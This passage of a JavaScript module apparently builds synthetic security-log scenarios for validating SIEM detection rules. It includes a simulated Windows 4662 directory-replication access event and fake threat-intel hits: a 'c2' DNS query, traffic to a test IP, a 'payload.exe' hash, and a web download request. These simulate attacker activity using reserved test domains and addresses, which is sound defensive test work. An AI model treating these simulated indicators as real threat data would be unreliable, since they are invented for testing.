      win(4662, { SubjectUserName: user('mallory'), SubjectDomainName: 'VALIDATION', ObjectServer: 'DS', ObjectType: '%{19195a5b-6da0-11d0-afd3-00c04fd930c9}', ObjectName: `%{${crypto.randomUUID()}}`, OperationType: 'Object Access', AccessList: '%%7688', AccessMask: '0x100',
        Properties: '%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}' }),
    ]);
  }

  // ================= Threat intel (needs the run's test IOC list: written by the live runner, built in offline)
  const intel = { domain: `${P}.invalid`, ip: `192.0.2.${pick(1, 254)}`, hash: crypto.createHash('sha256').update(`sentra-validation-${tag}`).digest('hex') };
  add('intel-dns', 'DNS query for a known-bad domain', 'Threat intel', ['SENTRA-INTEL-001'], [sysmon(22, { QueryName: `c2.${intel.domain}`, Image: 'C:\\Windows\\System32\\svchost.exe', QueryStatus: '0' }, { host: host('pc08') })], { intel: true });
  add('intel-ip', 'Traffic to an IOC IP address', 'Threat intel', ['SENTRA-INTEL-002'], [fgt(`logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=${intIp()} dstip=${intel.ip} srcport=53000 dstport=443 proto=6 action="accept" policyid=12 sentbyte=1200 rcvdbyte=800`)], { intel: true });
  add('intel-hash', 'Known-bad file hash observed (Sysmon 1)', 'Threat intel', ['SENTRA-INTEL-003'], [sysmon(1, { Image: `C:\\Users\\Public\\${P}-payload.exe`, ParentImage: 'C:\\Windows\\explorer.exe', CommandLine: `${P}-payload.exe`, Hashes: `SHA256=${intel.hash.toUpperCase()}`, User: `VALIDATION\\${user('bob')}` }, { host: host('pc09') })], { intel: true });
  add('intel-web', 'Web request to a known-bad domain', 'Threat intel', ['SENTRA-INTEL-004'], [fgt(`logid="0317013312" type="utm" subtype="webfilter" eventtype="ftgd_allow" level="notice" srcip=${intIp()} dstip=${ext()} srcport=54000 dstport=443 proto=6 action="passthrough" hostname="dl.${intel.domain}" url="/${P}" method="get"`)], { intel: true });

  // baseline ("new value") rules learn from the first event they see: send their scenarios first
  scenarios.sort((a, b) => (b.learning ? 1 : 0) - (a.learning ? 1 : 0));
  return { tag, prefix: P, scenarios, intel, skipped: SKIPPED.slice() };
}

module.exports = { buildScenarios };
